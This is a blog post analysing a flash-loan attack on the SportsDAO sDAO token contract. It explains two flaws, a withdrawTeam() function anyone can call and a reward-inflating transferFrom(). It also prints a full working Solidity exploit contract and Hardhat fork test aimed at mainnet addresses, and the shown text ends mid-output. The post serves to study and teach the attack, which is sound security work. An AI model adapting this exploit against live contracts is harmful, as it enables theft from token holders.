---
layout: post
title: 	"SportsDAO Flashloan Attack Analysis"
date:	2022-11-22 00:50:00 +0800
categories: blockchain
---

# Introduction

[@CertiKAlert tweeted out an alert for a flash loan attack on SportsDAO yesterday (November 21, 2022)](https://twitter.com/CertiKAlert/status/1594615286556393478). I spent ~1.5 hours recreating the exploit and analysing the contracts involved to understand the vulnerability, and determined that this was different from the Nereus Finance flash loan attack, so I decided to write a short blog post on it.

As always, you can find a full exploit on my [real world ethereum attacks](https://github.com/farazsth98/real-world-ethereum-hacks-remastered) repo, specifically:

- [Solidity exploit here](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/contracts/SportsDAOAttack/SportsDAOAttack.sol)
- [Hardhat test here](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/test/sportsdao_attack/sportsdao_attack.test.ts)

# Vulnerability Analysis

I couldn't find a website for SportsDAO, but they seem to be a dApp that sells NFTs for virtual sneakers. They have their own "sDAO" tokens, and the vulnerability in this case is within the [sDAO token contract](https://bscscan.com/address/0x6666625Ab26131B490E7015333F97306F05Bf816).

From the outside, the sDAO token seems just like any other IERC20 token. However, looking more carefully, there's a few bits of straight up ***weird*** functionality. Specifically, the token contract has a few extra functions, and overrides a few IERC20 functions. The ones relevant for this vulnerability are:

- `stakeLP()` - Allows a user to stake BUSD-sDAO LP tokens directly in this contract (this function deposits the LP tokens into this contract).

- `getReward()` - Allows a user to collect rewards (sDAO tokens) from the LP tokens they may have staked using the above function.

- `withdrawTeam()` - Transfers all LP tokens in this contract to a pre-set `TEAM` address. **This function is callable by any user externally**.

- `transferFrom()` - There's added functionality that deals with calculating the total staking reward tokens accumulated when sDAO tokens are transferred to the BUSD-sDAO LP token contract.

The vulnerability is twofold:

- The added functionality inside `transferFrom()` is incorrect. The same added functionality exists in the `transfer()` function, which ***seems to be*** correct.

- The ability to call `withdrawTeam()` externally allows any user to drain the LP tokens from the wallet. It gets drained to an EOA address owned by the SportsDAO team, which is fine, but the problem is that the amount of rewards to be sent to users are calculated using the amount of LP tokens in the contract (as we'll see below). The attacker abused this to get a huge amount of rewards tokens that they weren't entitled to.

Lets have a look at the relevant code that handles staking LP tokens and calculating rewards:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">stakeLP</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">uint _lpAmount</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span> <span style="color:rgb(66, 113, 174); font-weight:400;">updateReward</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">msg.sender</span>) </span>{
    <span style="color:rgb(245, 135, 31); font-weight:400;">require</span>(_lpAmount &gt;= <span style="color:rgb(245, 135, 31); font-weight:400;">1e18</span>, <span style="color:rgb(113, 140, 0); font-weight:400;">&quot;LP stake must more than 1&quot;</span>);
    LPInstance.transferFrom(_msgSender(), address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>), _lpAmount);
    userLPStakeAmount[_msgSender()] += _lpAmount;
}</code></pre>

This function simply transfers LP tokens from the caller to this contract, and tracks it inside the `userLPStakeAmount` mapping.

Now, a user may call the `getReward()` function to claim their accumulated reward tokens (in the form of sDAO):

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">getReward</span>(<span style="color:rgb(245, 135, 31); font-weight:400;"></span>) <span style="color:rgb(66, 113, 174); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">updateReward</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">msg.sender</span>) </span>{
    uint _reward = pendingToken(_msgSender());
    <span style="color:rgb(245, 135, 31); font-weight:400;">require</span>(_reward &gt; <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>, <span style="color:rgb(113, 140, 0); font-weight:400;">&quot;sDAOLP stake Reward is 0&quot;</span>);
    userRewards[_msgSender()] = <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>;
    <span style="color:rgb(137, 89, 168); font-weight:400;">if</span> (_reward &gt; <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>) {
        _standardTransfer(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>), _msgSender(), _reward);
        <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> ;
    }
}

modifier <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(66, 113, 174); font-weight:400;">updateReward</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address account</span>)</span> {
    PerTokenRewardLast = getPerTokenReward();
    lastTotalStakeReward = totalStakeReward;
    userRewards[account] = pendingToken(account);
    userRewardPerTokenPaid[account] = PerTokenRewardLast;
    _;
}

<span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">pendingToken</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address account</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">view</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">uint</span>) </span>{
    <span style="color:rgb(137, 89, 168); font-weight:400;">return</span>
    userLPStakeAmount[account]
        * (getPerTokenReward() - userRewardPerTokenPaid[account]) 
        / (<span style="color:rgb(245, 135, 31); font-weight:400;">1e18</span>)
        + (userRewards[account]);
}

<span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">getPerTokenReward</span>(<span style="color:rgb(245, 135, 31); font-weight:400;"></span>) <span style="color:rgb(66, 113, 174); font-weight:400;">public</span> <span style="color:rgb(66, 113, 174); font-weight:400;">view</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">uint</span>) </span>{
    <span style="color:rgb(137, 89, 168); font-weight:400;">if</span> ( LPInstance.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)) == <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>) {
        <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>;
    }

    uint newPerTokenReward = (totalStakeReward - lastTotalStakeReward) * <span style="color:rgb(245, 135, 31); font-weight:400;">1e18</span> / LPInstance.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>));
    <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> PerTokenRewardLast + newPerTokenReward;
}</code></pre>

To break it down a bit, `getReward()` uses the `updateReward()` modifier to update the user's rewards before the function actually runs. This modifier updates a few storage variables, but the one we care about is `PerTokenRewardLast`. This variable stores the most recent reward amount per token.

As seen above, the reward amount per token is calculated inside `getPerTokenReward()` using the following formula:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(245, 135, 31); font-weight:400;">uint</span> newPerTokenReward = (totalStakeReward - lastTotalStakeReward) * <span style="color:rgb(245, 135, 31); font-weight:400;">1e18</span> 
                         / LPInstance.balanceOf(address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>));</code></pre>

Now, remember the `withdrawTeam()` function that's callable by absolutely anyone? If we call that function to drain the LP tokens from this contract, and then send a tiny amount of LP tokens to this contract, then this function would end up calculating a huge value for `newPerTokenReward`, provided that `totalStakeReward - lastTotalStakeReward` is a decently large number.

So, the only constraint now is making sure `totalStakeReward - lastTotalStakeReward` is a large-ish number. `transferFrom()` allows us to do just that:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">transferFrom</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
    address <span style="color:rgb(137, 89, 168); font-weight:400;">from</span>,
    address to,
    <span class="hljs-built_in">uint</span> amount
</span>) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> <span style="color:rgb(137, 89, 168); font-weight:400;">virtual</span> <span style="color:rgb(137, 89, 168); font-weight:400;">override</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;"><span class="hljs-built_in">bool</span></span>)</span> {
    address spender = _msgSender();
    <span style="color:rgb(137, 89, 168); font-weight:400;">if</span> ( to == address(LPInstance) &amp;&amp; tx.origin != address(<span style="color:rgb(245, 135, 31); font-weight:400;">0x547d834975279964b65F3eC685963fCc4978631E</span>) ) {
        totalStakeReward += amount  * <span style="color:rgb(245, 135, 31); font-weight:400;">7</span> / <span style="color:rgb(245, 135, 31); font-weight:400;">100</span>;
        _standardTransfer(<span style="color:rgb(137, 89, 168); font-weight:400;">from</span>, address(<span style="color:rgb(137, 89, 168); font-weight:400;">this</span>), amount * <span style="color:rgb(245, 135, 31); font-weight:400;">7</span> / <span style="color:rgb(245, 135, 31); font-weight:400;">100</span> );
        _standardTransfer(<span style="color:rgb(137, 89, 168); font-weight:400;">from</span>, address(<span style="color:rgb(245, 135, 31); font-weight:400;">0x0294a4C3E85d57Eb3bE568aaC17C4243d9e78beA</span>), amount  / <span style="color:rgb(245, 135, 31); font-weight:400;">100</span> );
        _burn(<span style="color:rgb(137, 89, 168); font-weight:400;">from</span>, amount / <span style="color:rgb(245, 135, 31); font-weight:400;">50</span>);
        amount = amount  * <span style="color:rgb(245, 135, 31); font-weight:400;">90</span> / <span style="color:rgb(245, 135, 31); font-weight:400;">100</span>;
    }

    _spendAllowance(<span style="color:rgb(137, 89, 168); font-weight:400;">from</span>, spender, amount);
    _transfer(<span style="color:rgb(137, 89, 168); font-weight:400;">from</span>, to, amount);
    <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> <span style="color:rgb(245, 135, 31); font-weight:400;">true</span>;
}</code></pre>

The added functionality checks to see if the address we're sending sDAO tokens to is the BUSD-sDAO LP token address. If it is, then 7% of the amount is added to `totalStakeReward`. The issue here is any user is able to update `totalStakeReward`, which is used directly in the rewards per token calculation. This should not be functionality accessible by any user.

Similar (but correct) functionality exists inside the `transfer()` function:

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(77, 77, 76); font-weight:400;">function <span style="color:rgb(66, 113, 174); font-weight:400;">transfer</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address to, <span class="hljs-built_in">uint</span> amount</span>) <span style="color:rgb(137, 89, 168); font-weight:400;">public</span> <span style="color:rgb(137, 89, 168); font-weight:400;">virtual</span> <span style="color:rgb(137, 89, 168); font-weight:400;">override</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;"><span class="hljs-built_in">bool</span></span>)</span> {

    address owner = _msgSender();
    <span style="color:rgb(137, 89, 168); font-weight:400;">if</span> ( owner == address(LPInstance) &amp;&amp; tx.origin != address(<span style="color:rgb(245, 135, 31); font-weight:400;">0x547d834975279964b65F3eC685963fCc4978631E</span>) ) {
        totalStakeReward += amount  * <span style="color:rgb(245, 135, 31); font-weight:400;">7</span> / <span style="color:rgb(245, 135, 31); font-weight:400;">100</span>;
        <span style="color:rgb(142, 144, 140); font-weight:400;">// ...</span>
    }
    _transfer(owner, to, amount);
    <span style="color:rgb(137, 89, 168); font-weight:400;">return</span> <span style="color:rgb(245, 135, 31); font-weight:400;">true</span>;
}</code></pre>

Here, the `msg.sender` is required to be the LP token contract in order to update `totalStakeReward`. This seems to be the correct functionality.

# Plan of Attack

In order to keep the blog post short, that's as much as I'll get into the vulnerability. I invite the reader to read through the rest of the code to see how the storage variables interact to calculate the user's final reward before sending it to them. Specifically, you'll note that after `updateReward()` updates the `userReward` mapping for that user to a large number (as explained above), the next call to `pendingToken()` inside `getReward()` will return this same large number for the amount of rewards to be sent to the user.

Now, knowing the above, our plan of attack is as follows:

1. Get access to some BUSD and sDAO. 
2. Get access to some amount of BUSD-sDAO LP tokens using the above tokens.
3. Stake a decent amount of them so that the `userLPStakeAmount[our_address]` mapping has a value greater than 0.
4. Use the bug in `transferFrom()` to update `totalStakeReward` to a higher value (by transferring sDAO tokens to the LP token contract).
5. Use `withdrawTeam()` to set the sDAO token contract's LP token balance to 0.
6. Send a very small amount of LP tokens to the sDAO token contract.
7. Call `getReward()`. This will calculate a huge reward amount for us due to the bugs described above, and we'll get way more sDAO tokens returned back to us than we ever used in any of the above steps.

The attacker used [this DPPOracle contract](https://bscscan.com/address/0x26d0c625e5F5D6de034495fbDe1F6e9377185618) to get a flash loan for 500 BUSD. They used this BUSD to subsequently get some sDAO and BUSD-sDAO LP tokens.

The surprising aspect of a flash loan from this contract is that there is no extra fee that needs to be paid when returning the loan. If you flash loan 500 BUSD, you're only required to return 500 BUSD to complete the transaction. I found that surprising considering most flash loans require you to pay a fee.

I'll paste the full attack scripts below, but you can also find them on my repository.

**Note that the attack could have been optimised further to steal all the sDAO tokens that were in this contract. The SportsDAO team already removed the reference to the LP token in the contract's storage, so its not possible to perform this attack anymore. I invite curious readers to attempt to optimise the attack further.**

[SportsDAOAttack.sol](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/contracts/SportsDAOAttack/SportsDAOAttack.sol):

<pre>
 <code id="htmlViewer" style="color:rgb(77, 77, 76); font-weight:400;background-color:rgb(255, 255, 255);background:rgb(255, 255, 255);display:block;padding: .5em;"><span style="color:rgb(142, 144, 140); font-weight:400;">// SPDX-License-Identifier: MIT</span>

pragma solidity ^<span style="color:rgb(245, 135, 31); font-weight:400;">0.8</span><span style="color:rgb(245, 135, 31); font-weight:400;">.0</span>;

<span style="color:rgb(137, 89, 168); font-weight:400;">import</span> <span style="color:rgb(113, 140, 0); font-weight:400;">&#x27;hardhat/console.sol&#x27;</span>;

<span style="color:rgb(137, 89, 168); font-weight:400;">interface</span> IFlashLoaner {
  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">flashLoan</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
    uint256 baseAmount,
    uint256 quoteAmount,
    address _assetTo,
    bytes calldata data
  </span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span></span>;
}

<span style="color:rgb(137, 89, 168); font-weight:400;">interface</span> IPancakeRouter {
  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">swapExactTokensForTokensSupportingFeeOnTransferTokens</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
    uint256 amountIn,
    uint256 amountOutMin,
    address[] calldata path,
    address to,
    uint256 deadline
  </span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span></span>;

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">addLiquidity</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
    address tokenA,
    address tokenB,
    uint256 amountADesired,
    uint256 amountBDesired,
    uint256 amountAMin,
    uint256 amountBMin,
    address to,
    uint256 deadline
  </span>)
    <span style="color:rgb(66, 113, 174); font-weight:400;">external</span>
    <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">
      uint256 amountA,
      uint256 amountB,
      uint256 liquidity
    </span>)</span>;
}

<span style="color:rgb(137, 89, 168); font-weight:400;">interface</span> IBEP20 {
  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">approve</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address, uint256</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">bool</span>)</span>;

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">stakeLP</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">uint256 _lpAmount</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span></span>;

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">balanceOf</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">uint256</span>)</span>;

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">transfer</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address recipient, uint256 amount</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">bool</span>)</span>;

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">withdrawTeam</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">address _token</span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span></span>;

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">transferFrom</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
    address <span style="color:rgb(137, 89, 168); font-weight:400;">from</span>,
    address to,
    uint256 amount
  </span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span> <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">bool</span>)</span>;

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">getReward</span>(<span style="color:rgb(245, 135, 31); font-weight:400;"></span>) <span style="color:rgb(66, 113, 174); font-weight:400;">external</span></span>;
}

<span style="color:rgb(137, 89, 168); font-weight:400;">interface</span> IBEP20Pair is IBEP20 {
  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">getReserves</span>(<span style="color:rgb(245, 135, 31); font-weight:400;"></span>)
    <span style="color:rgb(66, 113, 174); font-weight:400;">external</span>
    <span style="color:rgb(66, 113, 174); font-weight:400;">view</span>
    <span style="color:rgb(66, 113, 174); font-weight:400;">returns</span> (<span style="color:rgb(245, 135, 31); font-weight:400;">
      uint112 reserve0,
      uint112 reserve1,
      uint32 blockTimestampLast
    </span>)</span>;
}

contract SportsDAOAttack {
  IFlashLoaner flashLoaner = IFlashLoaner(<span style="color:rgb(245, 135, 31); font-weight:400;">0x26d0c625e5F5D6de034495fbDe1F6e9377185618</span>);
  IPancakeRouter router = IPancakeRouter(<span style="color:rgb(245, 135, 31); font-weight:400;">0x10ED43C718714eb63d5aA57B78B54704E256024E</span>);
  IBEP20 busd = IBEP20(<span style="color:rgb(245, 135, 31); font-weight:400;">0x55d398326f99059fF775485246999027B3197955</span>);
  IBEP20 sdao = IBEP20(<span style="color:rgb(245, 135, 31); font-weight:400;">0x6666625Ab26131B490E7015333F97306F05Bf816</span>);
  IBEP20 wbnb = IBEP20(<span style="color:rgb(245, 135, 31); font-weight:400;">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span>); <span style="color:rgb(142, 144, 140); font-weight:400;">// Technically not IBEP20</span>
  IBEP20Pair busdsdao = IBEP20Pair(<span style="color:rgb(245, 135, 31); font-weight:400;">0x333896437125fF680f146f18c8A164Be831C4C71</span>);

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">exploit</span>(<span style="color:rgb(245, 135, 31); font-weight:400;"></span>) <span style="color:rgb(66, 113, 174); font-weight:400;">public</span> </span>{
    <span style="color:rgb(142, 144, 140); font-weight:400;">// Get the flashloan of 500 BUSD, calls `DPPFlashLoanCall()`</span>
    <span style="color:rgb(245, 135, 31); font-weight:400;">console</span>.log(<span style="color:rgb(113, 140, 0); font-weight:400;">&#x27;BUSD balance before attack: &#x27;</span>, busd.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)) / <span style="color:rgb(245, 135, 31); font-weight:400;">1</span> ether);
    flashLoaner.flashLoan(<span style="color:rgb(245, 135, 31); font-weight:400;">0</span>, <span style="color:rgb(245, 135, 31); font-weight:400;">500</span> ether, address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>), <span style="color:rgb(113, 140, 0); font-weight:400;">&#x27;A&#x27;</span>);
    <span style="color:rgb(245, 135, 31); font-weight:400;">console</span>.log(<span style="color:rgb(113, 140, 0); font-weight:400;">&#x27;BUSD balance after attack: &#x27;</span>, busd.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)) / <span style="color:rgb(245, 135, 31); font-weight:400;">1</span> ether);

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Transfer all the stolen BUSD to ourselves</span>
    busd.transfer(msg.sender, busd.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)));
  }

  <span style="color:rgb(77, 77, 76); font-weight:400;"><span style="color:rgb(137, 89, 168); font-weight:400;">function</span> <span style="color:rgb(66, 113, 174); font-weight:400;">DPPFlashLoanCall</span>(<span style="color:rgb(245, 135, 31); font-weight:400;">
    address,
    uint256,
    uint256,
    bytes calldata
  </span>) <span style="color:rgb(66, 113, 174); font-weight:400;">public</span> </span>{
    <span style="color:rgb(142, 144, 140); font-weight:400;">// Required approvals</span>
    busd.approve(address(router), <span style="color:rgb(137, 89, 168); font-weight:400;">type</span>(uint256).max);
    sdao.approve(address(router), <span style="color:rgb(137, 89, 168); font-weight:400;">type</span>(uint256).max);
    sdao.approve(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>), <span style="color:rgb(137, 89, 168); font-weight:400;">type</span>(uint256).max); <span style="color:rgb(142, 144, 140); font-weight:400;">// Required for transferFrom</span>
    wbnb.approve(address(router), <span style="color:rgb(137, 89, 168); font-weight:400;">type</span>(uint256).max);
    busdsdao.approve(address(router), <span style="color:rgb(137, 89, 168); font-weight:400;">type</span>(uint256).max);
    busdsdao.approve(address(sdao), <span style="color:rgb(137, 89, 168); font-weight:400;">type</span>(uint256).max);
    busdsdao.approve(address(busd), <span style="color:rgb(137, 89, 168); font-weight:400;">type</span>(uint256).max);

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Swap 250 BUSD for sDAO</span>
    address[] memory path = <span style="color:rgb(137, 89, 168); font-weight:400;">new</span> address[](<span style="color:rgb(245, 135, 31); font-weight:400;">2</span>);
    path[<span style="color:rgb(245, 135, 31); font-weight:400;">0</span>] = address(busd);
    path[<span style="color:rgb(245, 135, 31); font-weight:400;">1</span>] = address(sdao);

    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
      <span style="color:rgb(245, 135, 31); font-weight:400;">250</span> ether,
      <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>,
      path,
      address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>),
      block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>
    );

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Swap half of our sDAO and all our remaining 250 BUSD for LP tokens</span>
    router.addLiquidity(
      address(sdao),
      address(busd),
      sdao.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)) / <span style="color:rgb(245, 135, 31); font-weight:400;">2</span>,
      <span style="color:rgb(245, 135, 31); font-weight:400;">250</span> ether,
      <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>,
      <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>,
      address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>),
      block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>
    );

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Stake half of our LP tokens</span>
    sdao.stakeLP(busdsdao.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)) / <span style="color:rgb(245, 135, 31); font-weight:400;">2</span>);

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Transfer the remaining sDAO to the LP token address using</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;">// `transferFrom()`, required to get a higher totalStakeReward</span>
    sdao.transferFrom(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>), address(busdsdao), sdao.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)));

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Withdraw all the LP tokens to the TEAM</span>
    sdao.withdrawTeam(address(busdsdao));

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Transfer a tiny amount of our LP tokens to sDAO</span>
    busdsdao.transfer(address(sdao), <span style="color:rgb(245, 135, 31); font-weight:400;">0.013</span> ether);

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Now claim reward.</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;">//</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;">// The `updateReward()` modifier will set `PerTokenRewardLast` to an a high</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;">// value since the amount of LP tokens left in the contract is so little.</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;">// This will cause us to get a huge reward.</span>
    sdao.getReward();

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Swap all our sDAO for BUSD</span>
    path[<span style="color:rgb(245, 135, 31); font-weight:400;">0</span>] = address(sdao);
    path[<span style="color:rgb(245, 135, 31); font-weight:400;">1</span>] = address(busd);

    router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
      sdao.balanceOf(address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>)),
      <span style="color:rgb(245, 135, 31); font-weight:400;">0</span>,
      path,
      address(<span style="color:rgb(245, 135, 31); font-weight:400;">this</span>),
      block.timestamp * <span style="color:rgb(245, 135, 31); font-weight:400;">5</span>
    );

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Still have a bit of BUSD-sDAO LP tokens left in this contract. Can be</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;">// swapped back to BUSD and sDAO tokens using the router&#x27;s</span>
    <span style="color:rgb(142, 144, 140); font-weight:400;">// `removeLiquidity()` function. Left as an exercise for the reader.</span>

    <span style="color:rgb(142, 144, 140); font-weight:400;">// Return the BUSD we flash loaned</span>
    busd.transfer(address(flashLoaner), <span style="color:rgb(245, 135, 31); font-weight:400;">500</span> ether);
  }
}</code></pre>

[sportsdao_attack.test.ts](https://github.com/farazsth98/real-world-ethereum-hacks-remastered/blob/master/test/sportsdao_attack/sportsdao_attack.test.ts):

```ts
import { expect } from 'chai';
import { Contract, Signer } from 'ethers';
import { ethers } from 'hardhat';
import { getAbi } from '../utils/abi';
import { forkFrom } from '../utils/fork';

describe('SportsDAO Exploit', async () => {
  let attacker: Signer;
  let attackerContract: Contract;
  let busdContract: Contract;

  const BUSD_ADDRESS = '0x55d398326f99059fF775485246999027B3197955';

  before(async () => {
    // One block before the attack occurred.
    // Txn: https://bscscan.com/tx/0xb3ac111d294ea9dedfd99349304a9606df0b572d05da8cedf47ba169d10791ed
    await forkFrom(23241440);

    // Get an attacker EOA that we can use
    [attacker] = await ethers.getSigners();

    // Deploy the attacker script
    attackerContract = await (
      await ethers.getContractFactory('SportsDAOAttack', attacker)
    ).deploy();

    // NOTE: The code below is used for testing purposes so our flash loan
    // always gets repaid when testing the unfinished exploit.
    //
    // Mint a bunch of BUSD to ourselves
    const busd_abi = await getAbi('abis/BSC-USDABI.txt');
    busdContract = await ethers.getContractAt(busd_abi, BUSD_ADDRESS);

    /*const impersonated = await ethers.getImpersonatedSigner(
      '0xf68a4b64162906eff0ff6ae34e2bb1cd42fef62d',
    );

    await busdContract.connect(impersonated).transferOwnership(attacker.getAddress());

    await busdContract.connect(attacker).mint(ethers.utils.parseEther('500'));

    await busdContract
      .connect(attacker)
      .transfer(attackerContract.address, ethers.utils.parseEther('500'));*/
  });

  it('Exploits successfully', async () => {
    // Run our exploit
    await attackerContract.exploit();

    // We should expect to have more than 0 BUSD
    expect(await busdContract.balanceOf(attacker.getAddress())).to.be.gt('0');
  });
});
```

Exploit output:

```
$ yarn sportsdao
yarn run v1.22.19
$ npx hardhat test test/sportsdao_attack/sportsdao_attack.test.ts
Compiled 1 Solidity file successfully


